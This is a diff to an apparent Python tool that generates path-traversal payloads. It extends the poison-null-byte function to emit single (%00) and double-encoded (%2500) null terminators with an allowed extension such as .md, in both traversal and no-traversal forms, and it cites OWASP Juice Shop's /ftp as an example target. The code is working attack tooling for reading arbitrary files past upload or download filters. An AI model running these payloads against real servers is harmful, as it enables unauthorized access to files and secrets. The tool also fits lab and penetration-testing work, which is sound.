@@ -5,7 +5,7 @@ an already-encoded string, which would triple-encode and break the payload.
 """
 
 COMMON_BASES = ["/var/www/images/", "/var/www/html/", "/var/www/", "/home/user/"]
-NULL_EXTS = [".png", ".jpg", ".pdf"]
+NULL_EXTS = [".md", ".pdf", ".png", ".jpg"]
 
 
 def _rel(target_file: str) -> str:
@@ -42,11 +42,20 @@ def _leading_path(rel, depth):
     return out
 
 
-def _null_byte(rel, depth):
+def _null_byte(rel, depth, exts=None):
+    """Poison-null-byte: append an allowed extension after a null terminator.
+
+    Emits both single (%00) and double-encoded (%2500) forms — the latter is
+    needed where the % must itself be URL-encoded before it reaches the file
+    system layer (e.g. Node/Express, OWASP Juice Shop /ftp). Includes a
+    no-traversal variant for path-segment injection (…/FUZZ)."""
+    exts = exts if exts is not None else NULL_EXTS
     out = []
-    for ext in NULL_EXTS:
-        for n in range(1, depth + 1):
-            out.append(("../" * n) + rel + "%00" + ext)
+    for ext in exts:
+        for nul in ("%00", "%2500"):
+            out.append(rel + nul + ext)              # path-segment, no ../
+            for n in range(1, depth + 1):
+                out.append(("../" * n) + rel + nul + ext)
     return out
 
 
@@ -70,7 +79,8 @@ def _extended(rel, depth):
     return out
 
 
-def generate_payloads(target_file: str, depth: int = 8, os_filter: str = "both") -> list:
+def generate_payloads(target_file: str, depth: int = 8, os_filter: str = "both",
+                      null_exts=None) -> list:
     rel = _rel(target_file)
     out = []
     out.append(target_file)
@@ -78,7 +88,7 @@ def generate_payloads(target_file: str, depth: int = 8, os_filter: str = "both")
     out += _nonrecursive(rel, depth)
     out += _encoded(rel, depth)
     out += _leading_path(rel, depth)
-    out += _null_byte(rel, depth)
+    out += _null_byte(rel, depth, null_exts)
     out += _extended(rel, depth)
     if os_filter in ("windows", "both"):
         out += _windows(rel, depth)
